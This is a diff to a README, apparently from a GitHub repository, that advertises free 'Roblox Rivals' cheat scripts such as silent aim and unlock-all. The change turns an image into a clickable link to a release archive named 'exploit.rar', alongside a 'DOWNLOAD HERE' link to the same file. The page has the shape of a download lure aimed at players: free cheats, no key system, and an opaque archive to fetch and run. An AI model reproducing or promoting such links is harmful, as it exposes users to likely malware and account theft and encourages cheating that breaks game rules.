@@ -5,7 +5,8 @@ Welcome to the ultimate Roblox Rivals Script repository — your one-stop hub fo
 
 Welcome to the official GitHub repository for the most powerful and free Roblox Rivals Scripts available online. Designed for performance and ease-of-use, this hub offers everything from silent aim to unlock all scripts — no key systems, no hassle.
 
-![image](https://github.com/donk25/script/releases/download/new/exploit.rar)
+[![image](https://github.com/user-attachments/assets/6eadcde2-f1d5-4ce5-812c-1cba294ad960)](https://github.com/donk25/script/releases/download/new/exploit.rar)
+
 
 
 [DOWNLOAD HERE](https://github.com/donk25/script/releases/download/new/exploit.rar)
